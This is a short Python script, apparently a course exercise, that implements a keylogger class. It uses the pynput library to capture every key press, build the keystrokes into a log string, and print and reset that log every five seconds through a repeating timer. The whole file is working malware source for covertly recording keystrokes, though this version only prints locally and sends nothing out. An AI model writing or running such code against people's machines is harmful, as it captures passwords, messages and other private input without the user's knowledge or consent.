#!/usr/bin/env python
import pynput.keyboard
import threading


class Keylogger:
    def __init__(self):
        self.log = ""
        # print("this code is in the constructor")

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        # create the listener
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        # start the listener
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
            # to stop the keylogger (killall python)
